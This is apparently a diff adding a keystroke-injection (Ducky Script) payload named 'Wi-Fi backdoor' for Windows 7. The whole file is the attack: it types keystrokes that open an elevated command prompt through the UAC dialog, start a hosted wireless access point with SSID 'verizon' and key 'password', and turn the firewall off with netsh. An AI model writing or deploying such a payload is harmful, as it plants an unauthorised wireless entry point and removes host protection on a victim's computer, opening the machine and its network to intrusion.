@@ -1,0 +1,28 @@
+# Payload for Wi-Fi backdoor
+# Win7 - Open CMD bypassing UAC then creates wireless AP with SSID verizon and WPA key password, then lowers firewall mode.
+
+# Script Starts below
+
+CONTROL ESCAPE
+DELAY 200
+STRING cmd
+DELAY 200
+MENU
+DELAY 100
+STRING a
+DELAY 100
+LEFTARROW
+ENTER
+DELAY 200
+STRING netsh wlan set hostednetwork mode=allow ssid=verizon key=password
+ENTER
+DELAY 100
+STRING netsh wlan start hostednetwork
+ENTER
+DELAY 100
+STRING netsh firewall set opmode disable
+ENTER
+STRING exit
+ENTER
+
+# Script Ends above
